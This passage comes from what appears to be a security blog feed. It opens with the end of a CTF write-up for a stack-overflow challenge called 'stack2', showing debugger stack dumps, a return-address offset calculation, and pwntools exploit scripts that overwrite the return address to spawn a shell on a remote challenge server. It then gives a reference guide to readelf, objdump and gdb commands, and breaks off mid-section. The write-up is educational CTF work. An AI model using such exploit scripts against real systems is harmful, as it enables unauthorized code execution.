class="line">0xffffd400:     0x00000000      0x00000000      0x00000001      0x080484a0</span><br><span class="line">0xffffd410:     0x00000000      0xf7fe92c0      0xf7fe4140      0xf7ffd000</span><br><span class="line">0xffffd420:     0x00000001      0x080484a0      0x00000000      0x080484c1</span><br><span class="line">0xffffd430:     0x080485d0      0x00000001      0xffffd454      0x08048900</span><br><span class="line">0xffffd440:     0x08048960      0xf7fe4140      0xffffd44c      0x0000001c</span><br><span class="line">0xffffd450:     0x00000001      0xffffd576      0x00000000      0xffffd583</span><br><span class="line">0xffffd460:     0xffffd593      0xffffd5ae      0xffffd5de      0xffffd5f3</span><br><span class="line">0xffffd470:     0xffffd5fd      0xffffd60a      0xffffd619      0xffffd622</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>Copy them to a single file: <code>stackmemory</code>, and <code>grep</code> it:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cat stackmemory |grep 12345678</span><br><span class="line">0xffffd330:     0x00000000      0x00000000      0x12345678      0xf7ffc800</span><br></pre></td></tr></table></figure>
<p>So <code>v13</code> starts at <code>0xffffd338</code>.</p>
<p>Then we need to know where is the <code>ret addr</code>. Its value will be the <code>eip</code> register after this function’s <code>ret</code>, and its location will be the <code>esp</code> before <code>ret</code>.</p>
<p>Set a breakpoint before <code>ret</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x080488f2 in main ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────── registers ────</span><br><span class="line">$eax   : 0x0</span><br><span class="line">$ebx   : 0x0</span><br><span class="line">$ecx   : 0xffffd3c0  →  0x00000001</span><br><span class="line">$edx   : 0xffffd31c  →  0x00000005</span><br><span class="line">$esp   : 0xffffd3bc  →  0xf7dfdef1  →  &lt;__libc_start_main+241&gt; add esp, 0x10</span><br><span class="line">$ebp   : 0x0</span><br><span class="line">$esi   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">$edi   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">$eip   : 0x080488f2  →  &lt;main+802&gt; ret</span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063</span><br><span class="line">───────────────────── stack ────</span><br><span class="line">0xffffd3bc│+0x0000: 0xf7dfdef1  →  &lt;__libc_start_main+241&gt; add esp, 0x10         ← $esp</span><br><span class="line">0xffffd3c0│+0x0004: 0x00000001</span><br><span class="line">0xffffd3c4│+0x0008: 0xffffd454  →  0xffffd576  →  &quot;/root/stack2&quot;</span><br><span class="line">0xffffd3c8│+0x000c: 0xffffd45c  →  0xffffd583  →  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd3cc│+0x0010: 0xffffd3e4  →  0x00000000</span><br><span class="line">0xffffd3d0│+0x0014: 0x00000001</span><br><span class="line">0xffffd3d4│+0x0018: 0x00000000</span><br><span class="line">0xffffd3d8│+0x001c: 0xf7fbf000  →  0x001dfd6c</span><br><span class="line">─────────────── code:x86:32 ────</span><br><span class="line">    0x80488ea &lt;main+794&gt;       dec    DWORD PTR [ebx-0x723603b3]</span><br><span class="line">    0x80488f0 &lt;main+800&gt;       popa</span><br><span class="line">    0x80488f1 &lt;main+801&gt;       cld</span><br><span class="line"> →  0x80488f2 &lt;main+802&gt;       ret</span><br><span class="line">   ↳  0xf7dfdef1 &lt;__libc_start_main+241&gt; add    esp, 0x10</span><br><span class="line">      0xf7dfdef4 &lt;__libc_start_main+244&gt; sub    esp, 0xc</span><br><span class="line">      0xf7dfdef7 &lt;__libc_start_main+247&gt; push   eax</span><br><span class="line">      0xf7dfdef8 &lt;__libc_start_main+248&gt; call   0xf7e163d0 &lt;exit&gt;</span><br><span class="line">      0xf7dfdefd &lt;__libc_start_main+253&gt; push   esi</span><br><span class="line">      0xf7dfdefe &lt;__libc_start_main+254&gt; push   esi</span><br><span class="line">─────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;stack2&quot;, stopped 0x80488f2 in main (), reason: SINGLE STEP</span><br><span class="line">───────────────────── trace ────</span><br><span class="line">[#0] 0x80488f2 → main()</span><br><span class="line">────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>We can see <code>esp</code> &#x3D; <code>0xffffd3bc</code>. So <code>ret addr</code> is in <code>0xffffd3bc</code> on the stack.</p>
<p>Offset&#x2F;Index &#x3D; <code>0xffffd3bc</code> - <code>0xffffd338</code> &#x3D; <code>0x84</code> &#x3D; <code>132</code></p>
<p>Another method to calculate the offset is: get <code>ebp</code> after stepping into <code>main()</code>, then get <code>esp</code> before <code>ret</code>, the offset should be: offset&#x2F;index &#x3D; <code>esp</code> - <code>v13</code> &#x3D; <code>esp</code> - (<code>ebp</code> - <code>0x70</code>).</p>
<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>Origianl script was:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">34138</span>)</span><br><span class="line"></span><br><span class="line">hackhere = <span class="string">&#x27;0x0804859B&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x9b</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x85</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>While it went wrong:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python stack2.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./stack2&#x27;</span>: pid 4024</span><br><span class="line">[+] Opening connection to 220.249.52.133 on port 34138: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">1. show numbers</span><br><span class="line">2. add number</span><br><span class="line">3. change number</span><br><span class="line">4. get average</span><br><span class="line">5. <span class="built_in">exit</span></span><br><span class="line">sh: 1: /bin/bash: not found</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>As <code>sh: 1: /bin/bash: not found</code>, we can only build another system call by using <code>rop</code> gadgets. We can build <code>system(&#39;sh&#39;)</code> using the last two chars of <code>/bin/bash</code>, so the final exploit goes like:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">34138</span>)</span><br><span class="line">hackhere = <span class="string">&#x27;0x0804859B&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line">change(<span class="number">0x8c</span>, <span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">change(0x84, 0x9b)</span></span><br><span class="line"><span class="string">change(0x85, 0x85)</span></span><br><span class="line"><span class="string">change(0x86, 0x04)</span></span><br><span class="line"><span class="string">change(0x87, 0x08)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>stack-overflow</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Reverse Gadgets</title>
    <url>/2019/04/07/2019-04-07-Linux-Reverse-Gadgets/</url>
    <content><![CDATA[<p>Before doing Linux binary analysis, utils which are easy to use are essential.<br>Here are some utils when analysing ELF files or doing analysis on Linux, including ‘-h’ to search and some common usages</p>
<h2 id="Readelf-Usages"><a href="#Readelf-Usages" class="headerlink" title="Readelf Usages"></a>Readelf Usages</h2><p>Install <code>binutils</code> to use.</p>
<h3 id="Help-Page"><a href="#Help-Page" class="headerlink" title="Help Page"></a>Help Page</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: readelf &lt;option(s)&gt; elf-file(s)</span><br><span class="line"> Display information about the contents of ELF format files</span><br><span class="line"> Options are:</span><br><span class="line">  -a --all               Equivalent to: -h -l -S -s -r -d -V -A -I</span><br><span class="line">  -h --file-header       Display the ELF file header</span><br><span class="line">  -l --program-headers   Display the program headers</span><br><span class="line">     --segments          An <span class="built_in">alias</span> <span class="keyword">for</span> --program-headers</span><br><span class="line">  -S --section-headers   Display the section header</span><br><span class="line">     --sections          An <span class="built_in">alias</span> <span class="keyword">for</span> --section-headers</span><br><span class="line">  -g --section-groups    Display the section groups</span><br><span class="line">  -t --section-details   Display the section details</span><br><span class="line">  -e --headers           Equivalent to: -h -l -S</span><br><span class="line">  -s --syms              Display the symbol table</span><br><span class="line">     --symbols           An <span class="built_in">alias</span> <span class="keyword">for</span> --syms</span><br><span class="line">  --dyn-syms             Display the dynamic symbol table</span><br><span class="line">  -n --notes             Display the core notes (<span class="keyword">if</span> present)</span><br><span class="line">  -r --relocs            Display the relocations (<span class="keyword">if</span> present)</span><br><span class="line">  -u --unwind            Display the unwind info (<span class="keyword">if</span> present)</span><br><span class="line">  -d --dynamic           Display the dynamic section (<span class="keyword">if</span> present)</span><br><span class="line">  -V --version-info      Display the version sections (<span class="keyword">if</span> present)</span><br><span class="line">  -A --arch-specific     Display architecture specific information (<span class="keyword">if</span> any)</span><br><span class="line">  -c --archive-index     Display the symbol/file index <span class="keyword">in</span> an archive</span><br><span class="line">  -D --use-dynamic       Use the dynamic section info when displaying symbols</span><br><span class="line">  -x --hex-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as bytes</span><br><span class="line">  -p --string-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as strings</span><br><span class="line">  -R --relocated-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as relocated bytes</span><br><span class="line">  -z --decompress        Decompress section before dumping it</span><br><span class="line">  -w[lLiaprmfFsoRtUuTgAckK] or</span><br><span class="line">  --debug-dump[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,</span><br><span class="line">               =frames-interp,=str,=loc,=Ranges,=pubtypes,</span><br><span class="line">               =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,</span><br><span class="line">               =addr,=cu_index,=links,=follow-links]</span><br><span class="line">                         Display the contents of DWARF debug sections</span><br><span class="line">  --dwarf-depth=N        Do not display DIEs at depth N or greater</span><br><span class="line">  --dwarf-start=N        Display DIEs starting with N, at the same depth</span><br><span class="line">                         or deeper</span><br><span class="line">  -I --histogram         Display histogram of bucket list lengths</span><br><span class="line">  -W --wide              Allow output width to exceed 80 characters</span><br><span class="line">  @&lt;file&gt;                Read options from &lt;file&gt;</span><br><span class="line">  -H --<span class="built_in">help</span>              Display this information</span><br><span class="line">  -v --version           Display the version number of readelf</span><br></pre></td></tr></table></figure>
<h3 id="Common-Usages"><a href="#Common-Usages" class="headerlink" title="Common Usages"></a>Common Usages</h3><p>-h –file-header       Display the ELF file header</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  readelf -h /lib/x86_64-linux-gnu/libc.so.6 </span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2 s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - GNU</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x21ba0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          1795704 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         10</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         71</span><br><span class="line">  Section header string table index: 70</span><br></pre></td></tr></table></figure>
<p>-l –program-headers   Display the program headers</p>
<p>-S –section-headers   Display the sections’ header</p>
<p>-s –syms              Display the symbol table<br>(useful when want to search some syms, but just check, not locate)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  readelf -s /lib/x86_64-linux-gnu/libc.so.6 </span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains 2335 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global@GLIBC_PRIVATE (30)</span><br><span class="line">     2: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __libc_enable_secure@GLIBC_PRIVATE (30)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __tls_get_addr@GLIBC_2.3 (31)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _dl_exception_create@GLIBC_PRIVATE (30)</span><br><span class="line">     5: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global_ro@GLIBC_PRIVATE (30)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __tunable_get_val@GLIBC_PRIVATE (30)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="Objdump-Usages"><a href="#Objdump-Usages" class="headerlink" title="Objdump Usages"></a>Objdump Usages</h2><p>Install <code>binutils</code> to use.</p>
<h3 id="Help-Page-1"><a href="#Help-Page-1" class="headerlink" title="Help Page"></a>Help Page</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: objdump &lt;option(s)&gt; &lt;file(s)&gt;</span><br><span class="line"> Display information from object &lt;file(s)&gt;.</span><br><span class="line"> At least one of the following switches must be given:</span><br><span class="line">  -a, --archive-headers    Display archive header information</span><br><span class="line">  -f, --file-headers       Display the contents of the overall file header</span><br><span class="line">  -p, --private-headers    Display object format specific file header contents</span><br><span class="line">  -P, --private=OPT,OPT... Display object format specific contents</span><br><span class="line">  -h, --[section-]headers  Display the contents of the section headers</span><br><span class="line">  -x, --all-headers        Display the contents of all headers</span><br><span class="line">  -d, --disassemble        Display assembler contents of executable sections</span><br><span class="line">  -D, --disassemble-all    Display assembler contents of all sections</span><br><span class="line">  -S, --<span class="built_in">source</span>             Intermix <span class="built_in">source</span> code with disassembly</span><br><span class="line">  -s, --full-contents      Display the full contents of all sections requested</span><br><span class="line">  -g, --debugging          Display debug information <span class="keyword">in</span> object file</span><br><span class="line">  -e, --debugging-tags     Display debug information using ctags style</span><br><span class="line">  -G, --stabs              Display (<span class="keyword">in</span> raw form) any STABS info <span class="keyword">in</span> the file</span><br><span class="line">  -W[lLiaprmfFsoRtUuTgAckK] or</span><br><span class="line">  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,</span><br><span class="line">          =frames-interp,=str,=loc,=Ranges,=pubtypes,</span><br><span class="line">          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,</span><br><span class="line">          =addr,=cu_index,=links,=follow-links]</span><br><span class="line">                           Display DWARF info <span class="keyword">in</span> the file</span><br><span class="line">  -t, --syms               Display the contents of the symbol table(s)</span><br><span class="line">  -T, --dynamic-syms       Display the contents of the dynamic symbol table</span><br><span class="line">  -r, --reloc              Display the relocation entries <span class="keyword">in</span> the file</span><br><span class="line">  -R, --dynamic-reloc      Display the dynamic relocation entries <span class="keyword">in</span> the file</span><br><span class="line">  @&lt;file&gt;                  Read options from &lt;file&gt;</span><br><span class="line">  -v, --version            Display this program<span class="string">&#x27;s version number</span></span><br><span class="line"><span class="string">  -i, --info               List object formats and architectures supported</span></span><br><span class="line"><span class="string">  -H, --help               Display this information</span></span><br></pre></td></tr></table></figure>
<h3 id="Common-Usages-1"><a href="#Common-Usages-1" class="headerlink" title="Common Usages"></a>Common Usages</h3><p>-d, –disassemble        Display assembler contents of executable sections</p>
<p>-f, –file-headers       Display the contents of the overall file header</p>
<p>objdump -d -j .plt xxx     Display the PLT table (read only)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  objdump -d -j .plt /lib/x86_64-linux-gnu/libc.so.6 </span><br><span class="line"></span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">0000000000020fd0 &lt;*ABS*+0x86fa0@plt-0x10&gt;:</span><br><span class="line">   20fd0:	ff 35 32 30 39 00    	pushq  0x393032(%rip)        <span class="comment"># 3b4008 &lt;h_errlist@@GLIBC_2.2.5+0xf68&gt;</span></span><br><span class="line">   20fd6:	ff 25 34 30 39 00    	jmpq   *0x393034(%rip)        <span class="comment"># 3b4010 &lt;h_errlist@@GLIBC_2.2.5+0xf70&gt;</span></span><br><span class="line">   20fdc:	0f 1f 40 00          	nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>objdump -R xxx           Display the GOT table (read and write)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  objdump -R /lib/x86_64-linux-gnu/libc.so.6 </span><br><span class="line"></span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">00000000003b0620 R_X86_64_RELATIVE  *ABS*+0x00000000003b5560</span><br><span class="line">00000000003b0630 R_X86_64_RELATIVE  *ABS*+0x0000000000021360</span><br><span class="line">00000000003b0638 R_X86_64_RELATIVE  *ABS*+0x0000000000164e50</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">sometimes like:</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ff0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a000 R_386_JUMP_SLOT   <span class="built_in">read</span></span><br><span class="line">0804a004 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a008 R_386_JUMP_SLOT   __libc_start_main</span><br><span class="line">0804a00c R_386_JUMP_SLOT   write</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><h3 id="Basic-Commands"><a href="#Basic-Commands" class="headerlink" title="Basic Commands"></a>Basic Commands</h3><p>Normally we use <code>gdb</code> to open file by:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gdb -q --args program_name program_args</span><br></pre></td></tr></table></figure>
<p>After loading the program into <code>gdb</code>, you will have lots of commands to use.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run/r/start: to run the program</span><br><span class="line">The difference is: &#x27;run&#x27; is just load the program and run, but &#x27;start&#x27; means pause at the front of &#x27;main function&#x27; </span><br><span class="line">&#x27;show args&#x27; and &#x27;set args&#x27; to modify args</span><br><span class="line"></span><br><span class="line">break/b: to set breakpoint</span><br><span class="line"></span><br><span class="line">continue/c: to continue the rest program</span><br><span class="line"></span><br><span class="line">next/n: to get to the next line of source code but not step into the function </span><br><span class="line">ni: get to next instruction.</span><br><span class="line"></span><br><span class="line">step/s: to get next and step into the func </span><br><span class="line">si: step to next instruction.</span><br><span class="line"></span><br><span class="line">ni&amp;si: to run next instruction, and the difference is same as next&amp;step</span><br><span class="line"></span><br><span class="line">finish/fini: to run until return of this stack or func</span><br><span class="line"></span><br><span class="line">print/p: to print the value of variables</span><br><span class="line"></span><br><span class="line">list/l: to show 10 lines of codes, use list[m,n] and get codes from line m to line n</span><br><span class="line"></span><br><span class="line">backtrace/bt: to list stack called</span><br><span class="line"></span><br><span class="line">display,undisplay: track the value of the variable</span><br><span class="line"></span><br><span class="line">info/i: show information of &quot;args&quot;,&quot;locals&quot;,&quot;break&quot;,&quot;all-registers&quot; and so on</span><br><span class="line">info proc mapping(s): show memory mapped address</span><br><span class="line">info all-registers: show regs</span><br><span class="line"></span><br><span class="line">set: set values</span><br><span class="line">set *addr = val</span><br><span class="line">set args ...</span><br><span class="line">set environment LD_PRELOAD=./libx.so</span><br></pre></td></tr></table></figure>
<p>And </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def hook-stop: </span><br><span class="line">$ gdb ./linux_server -q</span><br><span class="line">Reading symbols from ./linux_server...</span><br><span class="line">(No debugging symbols found in ./linux_server)</span><br><span class="line">(gdb) define hook-stop</span><br><span class="line">Type commands for definition of &quot;hook-stop&quot;.</span><br><span class="line">End with a line saying just &quot;end&quot;.</span><br><span class="line">&gt;x/10i $pc</span><br><span class="line">&gt;end</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /root/linux_server</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">=&gt; 0xf7fd1ef9 &lt;__kernel_vsyscall+9&gt;:    pop    %ebp</span><br><span class="line">   0xf7fd1efa &lt;__kernel_vsyscall+10&gt;:   pop    %edx</span><br><span class="line">   0xf7fd1efb &lt;__kernel_vsyscall+11&gt;:   pop    %ecx</span><br><span class="line">   0xf7fd1efc &lt;__kernel_vsyscall+12&gt;:   ret</span><br><span class="line">   0xf7fd1efd:  nop</span><br><span class="line">   0xf7fd1efe:  nop</span><br><span class="line">   0xf7fd1eff:  nop</span><br><span class="line">   0xf7fd1f00:  nop</span><br><span class="line">   0xf7fd1f01:  lea    0x0(%esi,%eiz,1),%esi</span><br><span class="line">   0xf7fd1f08:  lea    0x0(%esi,%eiz,1),%esi</span><br><span class="line">0xf7fd1ef9 in __kernel_vsyscall ()</span><br><span class="line">(gdb)</span><br><span class="line"></span><br><span class="line">shell:</span><br><span class="line">(gdb) shell</span><br><span class="line">$ cd /</span><br><span class="line">$ ls</span><br><span class="line">bin   dev  home  lib    lib64   lost+found  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  init  lib32  libx32  media       opt  root  sbin  sys  usr</span><br><span class="line">$ exit</span><br><span class="line">exit</span><br><span class="line">(gdb)</span><br><span class="line"></span><br><span class="line">set follow-fork-mode [parent|child]: determining which process (thread) to attach, when encountering `fork` actions.</span><br><span class="line"></span><br><span class="line">set scheduler-locking [on|off|step]: only execute debugging thread and block others.</span><br></pre></td></tr></table></figure>
<h3 id="X-Commands"><a href="#X-Commands" class="headerlink" title="X Commands"></a>X Commands</h3><p>When discovering the memory, use <code>x</code> command to check.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">examine/x: to show memory</span><br><span class="line">usage: x /nfu &amp;lt;addr&amp;gt;</span><br><span class="line"></span><br><span class="line">n demonstrate number of memory units</span><br><span class="line"></span><br><span class="line">f demonstrate the method to display, can be:</span><br><span class="line">x Display variables in hexadecimal format.</span><br><span class="line">d Display variables in decimal format.</span><br><span class="line">u Display unsigned integers in decimal format.</span><br><span class="line">o Display variables in octal format.</span><br><span class="line">t Display variables in binary format.</span><br><span class="line">a Display variables in hexadecimal format.</span><br><span class="line">i instruction address format</span><br><span class="line">c Display variables in character format.</span><br><span class="line">f Display variables in floating point format.</span><br><span class="line"></span><br><span class="line">u represents the length of an address unit, can be:</span><br><span class="line">b means single byte,</span><br><span class="line">h means double-byte,</span><br><span class="line">w represents four bytes,</span><br><span class="line">g means eight bytes</span><br><span class="line"></span><br><span class="line">To sum up:</span><br><span class="line">Format letters are o(octal), x(hex), d(decimal), u(unsigneddecimal),</span><br><span class="line">t(binary), f(float), a(address), i(instruction), c(char) and s(string).</span><br><span class="line">Size letters are b(byte), h(halfword), w(word), g(giant, 8bytes)</span><br></pre></td></tr></table></figure>
<p>So what is commonly used?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /100wx addr     --    show memory for x86</span><br><span class="line">x /20gx addr      --    show memory for x64</span><br><span class="line">x /10i addr       --    display memory as instructions</span><br><span class="line">... </span><br></pre></td></tr></table></figure>
<h3 id="Debug-Running-Process"><a href="#Debug-Running-Process" class="headerlink" title="Debug Running Process"></a>Debug Running Process</h3><p>Debug local process dynamically<br>First, find the pid of xxx</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ps -ax | grep xxx</span><br></pre></td></tr></table></figure>
<p>If return the pid nnn, use</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdb xxx nnn</span><br></pre></td></tr></table></figure>
<p>or go into gdb to use</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(gdb) file /path/to/xxx</span><br></pre></td></tr></table></figure>
<p>and</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(gdb) attach nnn</span><br></pre></td></tr></table></figure>
<p>to attach gdb to the process</p>
<h3 id="gdb-gdbserver-Debug"><a href="#gdb-gdbserver-Debug" class="headerlink" title="gdb+gdbserver Debug"></a>gdb+gdbserver Debug</h3><p>Use <code>gdb</code> to connect to the stub, which <code>gdbserver</code> creates on the remote host.</p>
<p>First, build the <code>gdbserver</code> for target platform (take <code>arm</code> for e.g.)</p>
